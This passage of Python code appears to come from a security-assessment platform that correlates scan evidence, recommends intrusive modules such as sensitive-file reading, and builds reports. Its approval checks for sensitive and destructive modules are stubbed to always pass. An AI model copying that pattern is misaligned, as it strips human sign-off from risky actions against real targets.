    for job in JOB_STORE.list_jobs():
        meta = runtime_meta(job)
        if str(meta.get("assessment_id") or "") == assessment_id:
            jobs.append(job)
    jobs.sort(key=lambda item: str(item.get("created_at") or ""), reverse=True)
    return jobs


def assessment_recommendations(
    assessment_id: str,
    limit: int = 6,
    *,
    jobs: list[dict[str, Any]] | None = None,
    findings: list[dict[str, Any]] | None = None,
    correlation: dict[str, Any] | None = None,
    pending_approvals: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    risk_mode = normalize_risk_mode(str(assessment.get("risk_mode") or "safe"))
    chain_preset = normalize_chain_preset(str((assessment.get("metadata") or {}).get("chain_preset") or "full-chain-default"))
    allowed = select_chain_modules(risk_mode, chain_preset)
    jobs = jobs if jobs is not None else assessment_jobs(assessment_id)
    seen_completed: set[str] = set()
    for job in jobs:
        seen_completed.update(completed_module_ids(job))
    findings = findings if findings is not None else JOB_STORE.list_findings(assessment_id)
    open_findings = [item for item in findings if str(item.get("status") or "open") == "open"]
    pending_approvals = pending_approvals if pending_approvals is not None else assessment_pending_approval_modules(assessment_id)
    pending_ids = {item.get("module_id") for item in pending_approvals}
    modules_from_findings: list[str] = []
    for finding in open_findings:
        module_id = str(finding.get("module_id") or "")
        if module_id and module_id in allowed and module_id not in seen_completed and module_id not in modules_from_findings:
            modules_from_findings.append(module_id)
    priorities = (correlation if correlation is not None else assessment_correlation(assessment_id)).get("priority_queue", [])
    for item in priorities:
        for module_id in item.get("module_ids", []):
            if module_id in allowed and module_id not in seen_completed and module_id not in modules_from_findings:
                modules_from_findings.append(module_id)
    ordered_module_ids = modules_from_findings + [module_id for module_id in allowed if module_id not in seen_completed and module_id not in modules_from_findings]
    recommendations: list[dict[str, Any]] = []
    for module_id in ordered_module_ids:
        module = MODULE_BY_ID[module_id]
        reasons: list[str] = []
        if module_id in pending_ids:
            reasons.append("menunggu approval untuk membuka coverage modul sensitif")
        if any(str(item.get("module_id") or "") == module_id for item in open_findings):
            reasons.append("ada finding open dari modul terkait yang perlu validasi lanjutan")
        recommendations.append({
            "module_id": module.id,
            "title": module.title,
            "phase_label": module.phase_label,
            "risk_class": module.risk_class,
            "requires_approval": module.requires_approval,
            "operator_focus": module_playbook(module).operator_focus,
            "reason": "; ".join(reasons) if reasons else "melanjutkan coverage assessment yang belum selesai",
        })
        if len(recommendations) >= limit:
            break
    return {
        "assessment_id": assessment_id,
        "risk_mode": risk_mode,
        "chain_preset": chain_preset,
        "preset": chain_preset_definition(chain_preset),
        "completed_modules": len(seen_completed),
        "total_chain_modules": len(allowed),
        "open_findings": len(open_findings),
        "pending_approvals": len(pending_approvals),
        "recommended_modules": recommendations,
    }


def assessment_workspace_path(assessment_id: str) -> str:
    workspace = BASE_DIR / "backend" / "workspaces" / assessment_id
    workspace.mkdir(parents=True, exist_ok=True)
    for child in ("raw", "parsed", "reports", "logs", "exports"):
        (workspace / child).mkdir(exist_ok=True)
    return str(workspace)


def assessment_workspace_dir(assessment: dict[str, Any]) -> Path:
    metadata = assessment.get("metadata") if isinstance(assessment, dict) else {}
    workspace_value = str((metadata or {}).get("workspace") or "").strip()
    if workspace_value:
        workspace = Path(workspace_value)
    else:
        workspace = Path(assessment_workspace_path(str(assessment.get("id") or "default")))
    workspace.mkdir(parents=True, exist_ok=True)
    for child in ("raw", "parsed", "reports", "logs", "exports"):
        (workspace / child).mkdir(exist_ok=True)
    return workspace


def assessment_chain_preset(assessment: dict[str, Any] | None) -> str:
    if not assessment:
        return "full-chain-default"
    metadata = assessment.get("metadata") if isinstance(assessment, dict) else {}
    return normalize_chain_preset((metadata or {}).get("chain_preset"))


def deduplicate_evidence_items(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
    merged: list[dict[str, Any]] = []
    index_by_fingerprint: dict[str, int] = {}
    for item in items:
        if not isinstance(item, dict):
            continue
        normalized = {
            **item,
            "details": unique_text_lines([str(entry) for entry in item.get("details", [])], limit=40),
            "artifacts": deduplicate_artifacts(item.get("artifacts", {})),
        }
        fingerprint = evidence_fingerprint(normalized)
        existing_index = index_by_fingerprint.get(fingerprint)
        if existing_index is None:
            index_by_fingerprint[fingerprint] = len(merged)
            merged.append(normalized)
            continue
        existing = merged[existing_index]
        merged[existing_index] = {
            **existing,
            **normalized,
            "severity": severity_max(str(existing.get("severity") or "info"), str(normalized.get("severity") or "info")),
            "details": unique_text_lines([*existing.get("details", []), *normalized.get("details", [])], limit=40),
            "artifacts": deduplicate_artifacts({**existing.get("artifacts", {}), **normalized.get("artifacts", {})}),
        }
    return merged


def severity_summary_for_evidence(evidence: list[dict[str, Any]]) -> dict[str, int]:
    summary = blank_severity_summary()
    for item in evidence:
        severity = str(item.get("severity") or "info").lower()
        if severity not in summary:
            severity = "info"
        summary[severity] += 1
    return summary


def assessment_jobs_resolved(assessment_id: str) -> list[dict[str, Any]]:
    resolved: list[dict[str, Any]] = []
    for job in assessment_jobs(assessment_id):
        resolved.append(reconcile_job_state(job) or job)
    return resolved


def assessment_composite_job(assessment_id: str) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    jobs = assessment_jobs_resolved(assessment_id)
    evidence = deduplicate_evidence_items([item for job in jobs for item in job.get("evidence", []) if isinstance(item, dict)])
    module_runs = [run for job in jobs for run in job.get("module_runs", []) if isinstance(run, dict)]
    logs = [make_log(f"Assessment {assessment_id} aggregated from {len(jobs)} jobs.")]
    for job in jobs[:25]:
        logs.append(make_log(f"{job.get('scope_label', 'Job')} - {job.get('status', 'unknown')} - {job.get('progress', 0)}%"))
    return {
        "id": assessment_id,
        "scope_type": "assessment",
        "scope_label": f"Assessment {assessment.get('target')}",
        "target": assessment.get("target"),
        "note": assessment.get("note", ""),
        "status": assessment.get("status", "ready"),
        "progress": max([int(job.get("progress") or 0) for job in jobs], default=0),
        "created_at": assessment.get("created_at"),
        "updated_at": assessment.get("updated_at"),
        "module_ids": [run.get("module_id") for run in module_runs if run.get("module_id")],
        "logs": logs,
        "severity_summary": severity_summary_for_evidence(evidence),
        "evidence": evidence,
        "module_runs": module_runs,
        "runtime_meta": {
            "assessment_id": assessment_id,
            "risk_mode": normalize_risk_mode(str(assessment.get("risk_mode") or "safe")),
            "chain_preset": assessment_chain_preset(assessment),
        },
    }


def assessment_pending_approval_modules(assessment_id: str) -> list[dict[str, Any]]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    return []

def bulk_approvable_modules(assessment_id: str, risk_mode: str, chain_preset: str) -> list[Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    return []


def finding_rulepack_profile(item: dict[str, Any], finding: dict[str, Any]) -> dict[str, Any]:
    artifacts = item.get("artifacts") or {}
    title = str(finding.get("title") or "Finding")
    description = list(finding.get("description") or [])
    recommendations = list(finding.get("recommendations") or [])
    rule_id = "generic-evidence"
    if artifacts.get("web_ports") and artifacts.get("http_headers"):
        title = f"Eksposur fingerprint dan metadata web pada {', '.join([str(p) for p in artifacts.get('web_ports', [])][:3])}"
        description = ["Header atau fingerprint teknologi web terekspos dan dapat mempercepat enumerasi service.", *description]
        recommendations = ["Minimalkan banner leakage, header berlebih, dan fingerprint teknologi pada permukaan web.", *recommendations]
        rule_id = "web-metadata-exposure"
    elif artifacts.get("paths") or artifacts.get("indexed_paths"):
        title = "Paparan route atau path aplikasi memperluas permukaan enumerasi"
        description = ["Path discovery menunjukkan route yang dapat diprioritaskan untuk validasi hardening dan auth boundary.", *description]
        recommendations = ["Tinjau route sensitif, kebijakan auth, dan nonaktifkan exposure yang tidak dibutuhkan.", *recommendations]
        rule_id = "route-surface-exposure"
    elif artifacts.get("exposed_files") or artifacts.get("download_url"):
        title = "Paparan file sensitif atau URL unduhan teridentifikasi"
        description = ["Evidence menunjukkan artefak file atau URL yang dapat mengarah ke disclosure konfigurasi atau data.", *description]
        recommendations = ["Batasi akses file sensitif, audit direct download, dan terapkan kontrol akses yang konsisten.", *recommendations]
        rule_id = "sensitive-file-exposure"
    elif artifacts.get("dns_records") or artifacts.get("subdomains"):
        title = "Ekspansi DNS dan virtual host menambah permukaan target"
        description = ["Data DNS/subdomain menunjukkan perluasan permukaan yang perlu dikorelasikan dengan baseline exposure.", *description]
        recommendations = ["Validasi kepemilikan subdomain, hygiene DNS, dan hardening vhost yang masih aktif.", *recommendations]
        rule_id = "dns-surface-expansion"
    elif artifacts.get("open_ports"):
        title = "Permukaan port/service terbuka memerlukan validasi hardening"
        description = ["Service terbuka yang terobservasi perlu divalidasi terhadap kebutuhan operasional dan baseline exposure.", *description]
        recommendations = ["Review kebutuhan service, segmentasi, dan pembatasan akses service yang tidak esensial.", *recommendations]
        rule_id = "service-exposure"
    return {
        "title": clean_scanner_text(title),
        "description": clean_scanner_lines(description, limit=12),
        "recommendations": clean_scanner_lines(recommendations, limit=8),
        "rule_id": rule_id,
    }


def assessment_findings_records(assessment_id: str) -> list[dict[str, Any]]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    composite = assessment_composite_job(assessment_id)
    findings = collect_findings(composite)
    created_at = str(assessment.get("created_at") or now_iso())
    updated_at = now_iso()
    previous_by_source = {item.get("source_key"): item for item in JOB_STORE.list_findings(assessment_id)}
    records: list[dict[str, Any]] = []
    item_lookup = {}
    for item in composite.get("evidence", []):
        key = f"{str(item.get('module_id') or '')}|{severity_label_id(str(item.get('severity', 'info')))}|{clean_scanner_text(finding_profile(item)['title'])}"
        item_lookup[key] = item
    for finding in findings:
        source_item = item_lookup.get(f"{finding.get('module_id', '')}|{finding.get('severity', '')}|{finding.get('title', '')}", {})
        compare_key = hashlib.sha256(
            f"{assessment.get('target', '')}|{assessment.get('target_kind', 'ip')}|{finding.get('module_id', '')}|{finding.get('title', '')}".encode()
        ).hexdigest()
        source_key = hashlib.sha256(
            f"{assessment_id}|{finding.get('module_id', '')}|{finding.get('severity', '')}|{finding.get('title', '')}".encode()
        ).hexdigest()
        previous = previous_by_source.get(source_key) or {}
        previous_metadata = previous.get("metadata") if isinstance(previous, dict) else {}
        rulepack = finding_rulepack_profile(source_item if isinstance(source_item, dict) else {}, finding)
        records.append({
            "id": str(previous.get("id") or f"finding-{source_key[:16]}"),
            "assessment_id": assessment_id,
            "source_key": source_key,
            "target": str(assessment.get("target") or ""),
            "title": str(rulepack.get("title") or finding.get("title") or "Finding"),
            "severity": str(finding.get("severity") or "INFO"),
            "status": str(previous.get("status") or "open"),
            "module_id": str(finding.get("module_id") or ""),
            "module_title": str(finding.get("module_title") or ""),
            "phase_label": str(finding.get("phase_label") or ""),
            "description": rulepack.get("description") or finding.get("description") or [],
            "impact": finding.get("impact") or [],
            "recommendations": rulepack.get("recommendations") or finding.get("recommendations") or [],
            "evidence_lines": finding.get("evidence_lines") or [],
            "artifacts": finding.get("artifacts") or {},
            "job_refs": list({run.get("job_id") for run in composite.get("module_runs", []) if run.get("job_id") and run.get("module_id") == finding.get("module_id")}),
            "created_at": str(previous.get("created_at") or created_at),
            "updated_at": updated_at,
            "metadata": {
                **(previous_metadata if isinstance(previous_metadata, dict) else {}),
                "execution_profile": finding.get("execution_profile", "-"),
                "number": finding.get("number", 0),
                "compare_key": compare_key,
                "rule_id": rulepack.get("rule_id", "generic-evidence"),
            },
        })
    return records


def sync_assessment_findings(assessment_id: str) -> list[dict[str, Any]]:
    records = assessment_findings_records(assessment_id)
    JOB_STORE.replace_assessment_findings(assessment_id, records)
    return JOB_STORE.list_findings(assessment_id)


def assessment_findings_summary(assessment_id: str) -> dict[str, Any]:
    findings = JOB_STORE.list_findings(assessment_id)
    severity_summary = {"KRITIS": 0, "TINGGI": 0, "SEDANG": 0, "RENDAH": 0, "INFO": 0}
    status_summary: dict[str, int] = {}
    for finding in findings:
        severity = str(finding.get("severity") or "INFO").upper()
        severity_summary[severity] = severity_summary.get(severity, 0) + 1
        status = str(finding.get("status") or "open").lower()
        status_summary[status] = status_summary.get(status, 0) + 1
    return {
        "assessment_id": assessment_id,
        "total": len(findings),
        "severity_summary": severity_summary,
        "status_summary": status_summary,
        "top_findings": findings[:5],
    }


def assessment_exposure_drift(assessment_id: str, *, correlation: dict[str, Any] | None = None) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    current = correlation if correlation is not None else assessment_correlation(assessment_id)
    candidates = [item for item in JOB_STORE.list_assessments() if str(item.get("id")) != assessment_id and str(item.get("target")) == str(assessment.get("target")) and normalize_target_kind(str(item.get("target_kind") or "ip")) == normalize_target_kind(str(assessment.get("target_kind") or "ip"))]
    baseline = candidates[0] if candidates else None
    categories = ["open_ports", "web_ports", "paths", "subdomains", "dns_records", "exposed_files", "download_urls"]
    current_signals = current.get("signals", {})
    if not baseline:
        return {"assessment_id": assessment_id, "baseline_assessment_id": None, "new_signals": current_signals, "resolved_signals": {key: [] for key in categories}, "summary": {key: {"new": len(current_signals.get(key, [])), "resolved": 0} for key in categories}}
    baseline_signals = assessment_correlation(str(baseline.get("id"))).get("signals", {})
    new_signals = {}
    resolved_signals = {}
    summary = {}
    for key in categories:
        current_values = [str(item) for item in current_signals.get(key, [])]
        baseline_values = [str(item) for item in baseline_signals.get(key, [])]
        new_signals[key] = [item for item in current_values if item not in baseline_values]
        resolved_signals[key] = [item for item in baseline_values if item not in current_values]
        summary[key] = {"new": len(new_signals[key]), "resolved": len(resolved_signals[key])}
    return {"assessment_id": assessment_id, "baseline_assessment_id": str(baseline.get("id")), "new_signals": new_signals, "resolved_signals": resolved_signals, "summary": summary}


def approvals_dashboard() -> dict[str, Any]:
    # Approval flow dinonaktifkan untuk operasi assessment reguler agar UX lebih cepat
    # dan summary tidak membingungkan operator.
    return {
        "counts": {"active": 0, "expired": 0, "destructive": 0},
        "approvals": [],
        "pending": [],
    }


def assessment_findings_diff(assessment_id: str, *, findings: list[dict[str, Any]] | None = None) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    current = findings if findings is not None else JOB_STORE.list_findings(assessment_id)
    candidates = [item for item in JOB_STORE.list_assessments() if str(item.get("id")) != assessment_id and str(item.get("target")) == str(assessment.get("target")) and normalize_target_kind(str(item.get("target_kind") or "ip")) == normalize_target_kind(str(assessment.get("target_kind") or "ip"))]
    baseline = candidates[0] if candidates else None
    if not baseline:
        return {"assessment_id": assessment_id, "baseline_assessment_id": None, "new": [], "recurring": current, "resolved": []}
    baseline_findings = JOB_STORE.list_findings(str(baseline.get("id")))
    current_map = {str((item.get("metadata") or {}).get("compare_key") or item.get("source_key") or item.get("id")): item for item in current}
    baseline_map = {str((item.get("metadata") or {}).get("compare_key") or item.get("source_key") or item.get("id")): item for item in baseline_findings}
    new_findings = [item for key, item in current_map.items() if key not in baseline_map]
    recurring = [item for key, item in current_map.items() if key in baseline_map]
    resolved = [item for key, item in baseline_map.items() if key not in current_map]
    return {
        "assessment_id": assessment_id,
        "baseline_assessment_id": str(baseline.get("id")),
        "new": new_findings,
        "recurring": recurring,
        "resolved": resolved,
    }


def remediation_summary(assessment_id: str) -> dict[str, Any]:
    findings = JOB_STORE.list_findings(assessment_id)
    summary = {"assigned": 0, "with_due_date": 0, "overdue_open": 0, "sla_values": {}}
    now = datetime.now(timezone.utc)
    for finding in findings:
        metadata = finding.get("metadata") or {}
        owner = str(metadata.get("owner") or "").strip()
        due_date = parse_iso_timestamp(str(metadata.get("due_date") or "")) if str(metadata.get("due_date") or "").strip() else None
        sla = str(metadata.get("sla") or "").strip()
        status = str(finding.get("status") or "open").lower()
        if owner:
            summary["assigned"] += 1
        if due_date:
            summary["with_due_date"] += 1
        if due_date and due_date < now and status in {"open", "accepted-risk"}:
            summary["overdue_open"] += 1
        if sla:
            summary["sla_values"][sla] = summary["sla_values"].get(sla, 0) + 1
    return summary


def assessment_detail(
    assessment_id: str,
    *,
    findings: list[dict[str, Any]] | None = None,
    approvals: list[dict[str, Any]] | None = None,
    jobs: list[dict[str, Any]] | None = None,
    pending: list[dict[str, Any]] | None = None,
    diff: dict[str, Any] | None = None,
    drift: dict[str, Any] | None = None,
    severity_summary: dict[str, int] | None = None,
) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    findings = findings if findings is not None else JOB_STORE.list_findings(assessment_id)
    approvals = approvals if approvals is not None else JOB_STORE.list_approvals(assessment_id)
    jobs = jobs if jobs is not None else assessment_jobs_resolved(assessment_id)
    pending = pending if pending is not None else assessment_pending_approval_modules(assessment_id)
    diff = diff if diff is not None else assessment_findings_diff(assessment_id, findings=findings)
    drift = drift if drift is not None else assessment_exposure_drift(assessment_id)
    remediation = remediation_summary(assessment_id)
    severity_summary = severity_summary if severity_summary is not None else assessment_findings_summary(assessment_id)["severity_summary"]
    return {
        "assessment_id": assessment_id,
        "job_count": len(jobs),
        "approval_count": 0,
        "finding_count": len(findings),
        "pending_approval_count": 0,
        "pending_approval_modules": [],
        "severity_summary": severity_summary,
        "workspace": str((assessment.get("metadata") or {}).get("workspace") or "-"),
        "last_job_updated_at": jobs[0].get("updated_at") if jobs else assessment.get("updated_at"),
        "diff_summary": {"baseline_assessment_id": diff.get("baseline_assessment_id"), "new": len(diff.get("new", [])), "recurring": len(diff.get("recurring", [])), "resolved": len(diff.get("resolved", []))},
        "drift_summary": drift.get("summary", {}),
        "remediation_summary": remediation,
    }


def assessment_correlation(assessment_id: str, *, jobs: list[dict[str, Any]] | None = None) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    jobs = jobs if jobs is not None else assessment_jobs_resolved(assessment_id)
    evidence = [item for job in jobs for item in job.get("evidence", []) if isinstance(item, dict)]
    completed = set()
    for job in jobs:
        completed.update(completed_module_ids(job))
    services: list[dict[str, str]] = []
    service_seen: set[str] = set()
    open_ports: list[str] = []
    web_ports: list[str] = []
    paths: list[str] = []
    exposed_files: list[str] = []
    subdomains: list[str] = []
    dns_records: list[str] = []
    download_urls: list[str] = []
    module_hits: dict[str, int] = {}
    for job in jobs:
        for service in infer_service_inventory(job):
            key = json.dumps(service, sort_keys=True)
            if key in service_seen:
                continue
            service_seen.add(key)
            services.append(service)
    for item in evidence:
        module_id = str(item.get("module_id") or "")
        if module_id:
            module_hits[module_id] = module_hits.get(module_id, 0) + 1
        artifacts = item.get("artifacts", {}) if isinstance(item, dict) else {}
        for port in artifacts.get("web_ports", []) if isinstance(artifacts, dict) else []:
            value = str(port).strip()
            if value and value not in web_ports:
                web_ports.append(value)
        for entry in artifacts.get("open_ports", []) if isinstance(artifacts, dict) else []:
            if isinstance(entry, dict):
                value = str(entry.get("port") or "").strip()
            else:
                value = str(entry).strip()
            if value and value not in open_ports:
                open_ports.append(value)
        for value in artifacts.get("paths", []) if isinstance(artifacts, dict) else []:
            item_value = str(value).strip()
            if item_value and item_value not in paths:
                paths.append(item_value)
        for value in artifacts.get("exposed_files", []) if isinstance(artifacts, dict) else []:
            item_value = str(value).strip()
            if item_value and item_value not in exposed_files:
                exposed_files.append(item_value)
        for value in artifacts.get("subdomains", []) if isinstance(artifacts, dict) else []:
            item_value = str(value).strip()
            if item_value and item_value not in subdomains:
                subdomains.append(item_value)
        for value in artifacts.get("dns_records", []) if isinstance(artifacts, dict) else []:
            item_value = str(value).strip()
            if item_value and item_value not in dns_records:
                dns_records.append(item_value)
        download_url = str(artifacts.get("download_url") or "").strip() if isinstance(artifacts, dict) else ""
        if download_url and download_url not in download_urls:
            download_urls.append(download_url)

    def make_priority(priority_id: str, title: str, reason: str, module_ids: list[str]) -> dict[str, Any] | None:
        filtered = [module_id for module_id in module_ids if module_id in MODULE_BY_ID and module_id not in completed]
        if not filtered:
            return None
        highest = max((MODULE_BY_ID[module_id].risk_class for module_id in filtered), key=lambda value: {"safe": 0, "deep": 1, "intrusive": 2}.get(value, 0), default="safe")
        return {
            "id": priority_id,
            "title": title,
            "reason": reason,
            "module_ids": filtered,
            "modules": [MODULE_BY_ID[module_id].title for module_id in filtered],
            "risk_class": highest,
        }

    priorities: list[dict[str, Any]] = []
    if web_ports or paths:
        item = make_priority(
            "web-surface",
            "Korelasi permukaan web",
            "Port web atau route exposure sudah muncul. Lanjutkan korelasi header, fingerprint, dan path untuk memvalidasi prioritas hardening.",
            ["baseline-web-fingerprint", "web-security-header-audit", "baseline-content-discovery", "baseline-gobuster-routes"],
        )
        if item:
            priorities.append(item)
    if subdomains or dns_records:
        item = make_priority(
            "dns-vhost",
            "Korelasi DNS dan virtual host",
            "Ada indikasi record DNS/subdomain. Validasi naming, vhost, dan coverage permukaan agar scope assessment lebih utuh.",
            ["recon-dns-enumeration", "recon-amass-expansion", "baseline-tls-dns-review"],
        )
        if item:
            priorities.append(item)
    if exposed_files or download_urls:
        item = make_priority(
            "config-leakage",
            "Validasi kebocoran konfigurasi atau file sensitif",
            "Evidence menunjukkan file sensitif atau URL unduhan. Prioritaskan triage kredensial/config leakage secara terkendali.",
            ["sensitive-file-discovery", "read-sensitive-file"],
        )
        if item:
            priorities.append(item)
    if open_ports and not priorities:
        item = make_priority(
            "service-expansion",
            "Perluas inventaris service",
            "Port terbuka sudah terdeteksi tetapi korelasi layer aplikasi masih minim. Lanjutkan baseline service dan TLS.",
            ["recon-service-scan", "baseline-tls-dns-review", "baseline-web-fingerprint"],
        )
        if item:
            priorities.append(item)

    return {
        "assessment_id": assessment_id,
        "job_count": len(jobs),
        "evidence_count": len(evidence),
        "completed_modules": len(completed),
        "service_inventory": services[:20],
        "signals": {
            "open_ports": open_ports,
            "web_ports": web_ports,
            "paths": paths[:30],
            "exposed_files": exposed_files[:20],
            "subdomains": subdomains[:20],
            "dns_records": dns_records[:20],
            "download_urls": download_urls[:10],
        },
        "top_modules": sorted(({"module_id": module_id, "count": count, "title": MODULE_BY_ID[module_id].title} for module_id, count in module_hits.items() if module_id in MODULE_BY_ID), key=lambda item: (-item["count"], item["title"]))[:8],
        "priority_queue": priorities,
    }


def workspace_file_manifest(base: Path, directory: Path) -> list[dict[str, Any]]:
    items: list[dict[str, Any]] = []
    for child in sorted(directory.iterdir(), key=lambda entry: (entry.is_file(), entry.name.lower())):
        relative = child.relative_to(base).as_posix()
        item = {
            "path": relative,
            "name": child.name,
            "kind": "dir" if child.is_dir() else "file",
            "size": child.stat().st_size if child.is_file() else 0,
        }
        if child.is_file():
            item["mime"] = "text/html" if child.suffix.lower() == ".html" else "application/json" if child.suffix.lower() == ".json" else "text/plain"
        items.append(item)
    return items


def ensure_workspace_artifacts(assessment_id: str) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    workspace = assessment_workspace_dir(assessment)
    composite = assessment_composite_job(assessment_id)
    recommendations = assessment_recommendations(assessment_id)
    correlation = assessment_correlation(assessment_id)
    jobs = assessment_jobs_resolved(assessment_id)
    report_md = build_assessment_markdown_report(assessment_id)
    report_html = build_assessment_html_report(assessment_id)
    (workspace / "reports" / "assessment-report.md").write_text(report_md)
    (workspace / "reports" / "assessment-report.html").write_text(report_html)
    (workspace / "parsed" / "deep-correlation.json").write_text(json.dumps(correlation, indent=2, ensure_ascii=False))
    findings = sync_assessment_findings(assessment_id)
    finding_summary = assessment_findings_summary(assessment_id)
    detail = assessment_detail(assessment_id)
    diff = assessment_findings_diff(assessment_id)
    drift = assessment_exposure_drift(assessment_id)
    approvals_view = approvals_dashboard()
    (workspace / "parsed" / "normalized-findings.json").write_text(json.dumps(findings, indent=2, ensure_ascii=False))
    (workspace / "parsed" / "findings-summary.json").write_text(json.dumps(finding_summary, indent=2, ensure_ascii=False))
    (workspace / "parsed" / "exposure-drift.json").write_text(json.dumps(drift, indent=2, ensure_ascii=False))
    (workspace / "parsed" / "approvals-dashboard.json").write_text(json.dumps(approvals_view, indent=2, ensure_ascii=False))
    (workspace / "exports" / "assessment-evidence.json").write_text(json.dumps({
        "assessment": assessment,
        "recommendations": recommendations,
        "correlation": correlation,
        "findings": findings,
        "finding_summary": finding_summary,
        "detail": detail,
        "diff": diff,
        "drift": drift,
        "jobs": jobs,
    }, indent=2, ensure_ascii=False))
    (workspace / "exports" / "jobs-summary.json").write_text(json.dumps({
        "assessment_id": assessment_id,
        "job_count": len(jobs := assessment_jobs_resolved(assessment_id)),
        "jobs": [{
            "id": job.get("id"),
            "scope_label": job.get("scope_label"),
            "status": job.get("status"),
            "progress": job.get("progress"),
            "evidence_count": len(job.get("evidence", [])),
            "module_count": len(job.get("module_runs", [])),
        } for job in jobs],
    }, indent=2, ensure_ascii=False))
    (workspace / "logs" / "assessment-log.txt").write_text("\n".join(
        [f"[{entry['timestamp']}] {entry['severity'].upper()} {entry['message']}" for entry in composite.get("logs", [])]
    ))
    sections = []
    for section_name in ("raw", "parsed", "reports", "logs", "exports"):
        directory = workspace / section_name
        sections.append({"name": section_name, "entries": workspace_file_manifest(workspace, directory)})
    return {
        "workspace": str(workspace),
        "sections": sections,
    }


def build_assessment_bundle(assessment_id: str, *, include_workspace: bool = True) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    approvals = JOB_STORE.list_approvals(assessment_id)
    jobs = assessment_jobs_resolved(assessment_id)
    findings = sync_assessment_findings(assessment_id)
    finding_summary = assessment_findings_summary(assessment_id)
    correlation = assessment_correlation(assessment_id, jobs=jobs)
    pending = assessment_pending_approval_modules(assessment_id)
    recommendations = assessment_recommendations(
        assessment_id,
        jobs=jobs,
        findings=findings,
        correlation=correlation,
        pending_approvals=pending,
    )
    diff = assessment_findings_diff(assessment_id, findings=findings)
    drift = assessment_exposure_drift(assessment_id, correlation=correlation)
    detail = assessment_detail(
        assessment_id,
        findings=findings,
        approvals=approvals,
        jobs=jobs,
        pending=pending,
        diff=diff,
        drift=drift,
        severity_summary=finding_summary.get("severity_summary", {}),
    )
    payload = {
        "assessment": assessment,
        "approvals": approvals,
        "recommendations": recommendations,
        "correlation": correlation,
        "findings": findings,
        "finding_summary": finding_summary,
        "detail": detail,
        "diff": diff,
        "drift": drift,
        "approvals_dashboard": approvals_dashboard(),
    }
    if include_workspace:
        payload["workspace"] = ensure_workspace_artifacts(assessment_id)
    return payload


def read_workspace_file(assessment_id: str, relative_path: str) -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    workspace = assessment_workspace_dir(assessment).resolve()
    candidate = (workspace / relative_path).resolve()
    if workspace not in candidate.parents and candidate != workspace:
        raise HTTPException(status_code=400, detail="Workspace path is invalid")
    if not candidate.exists() or not candidate.is_file():
        raise HTTPException(status_code=404, detail="Workspace file not found")
    content = candidate.read_text(errors="replace")
    return {
        "path": candidate.relative_to(workspace).as_posix(),
        "name": candidate.name,
        "mime": "text/html" if candidate.suffix.lower() == ".html" else "application/json" if candidate.suffix.lower() == ".json" else "text/plain",
        "content": content,
    }


def approval_required(module, risk_mode: str) -> bool:
    return False


def parse_iso_timestamp(value: str) -> datetime | None:
    raw = str(value or "").strip()
    if not raw:
        return None
    normalized = raw.replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError as error:
        raise HTTPException(status_code=400, detail=f"Timestamp tidak valid: {value}") from error
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def is_approval_expired(approval: dict[str, Any] | None) -> bool:
    if not approval:
        return False
    expires_at = parse_iso_timestamp(str(approval.get("expires_at") or ""))
    return bool(expires_at and expires_at <= datetime.now(timezone.utc))


def require_valid_approval_record(approval: dict[str, Any] | None, detail: str) -> dict[str, Any]:
    if not approval:
        raise HTTPException(status_code=403, detail=detail)
    if is_approval_expired(approval):
        raise HTTPException(status_code=403, detail="Stored approval has expired and must be renewed")
    return approval


def range_password_configured() -> bool:
    return bool(RANGE_SAVE_PASSWORD_HASH or RANGE_SAVE_PASSWORD)


def verify_range_password(candidate: str) -> bool:
    if not range_password_configured():
        return False
    provided = str(candidate or "")
    if RANGE_SAVE_PASSWORD_HASH:
        digest = hashlib.sha256(provided.encode("utf-8")).hexdigest()
        return hmac.compare_digest(digest, RANGE_SAVE_PASSWORD_HASH)
    return hmac.compare_digest(provided, RANGE_SAVE_PASSWORD)


def destructive_approval_module_id(action: str) -> str:
    return f"destructive:{str(action or '').strip()}"


def destructive_confirmation_token(assessment_id: str, action: str, target: str) -> str:
    return f"CONFIRM-DESTRUCTIVE::{assessment_id}::{action}::{target}"


def validate_assessment_access(assessment_id: str, target: str, risk_mode: str, target_kind: str = "ip") -> dict[str, Any]:
    assessment = JOB_STORE.get_assessment(assessment_id)
    if not assessment:
        raise HTTPException(status_code=404, detail="Assessment not found")
    if str(assessment.get("target")) != str(target):
        raise HTTPException(status_code=409, detail="Assessment target does not match requested target")
    if normalize_target_kind(str(assessment.get("target_kind") or "ip")) != normalize_target_kind(target_kind):
        raise HTTPException(status_code=409, detail="Assessment target kind does not match requested target kind")
    assessment_risk_mode = normalize_risk_mode(str(assessment.get("risk_mode") or "safe"))
    requested_risk_mode = normalize_risk_mode(risk_mode)
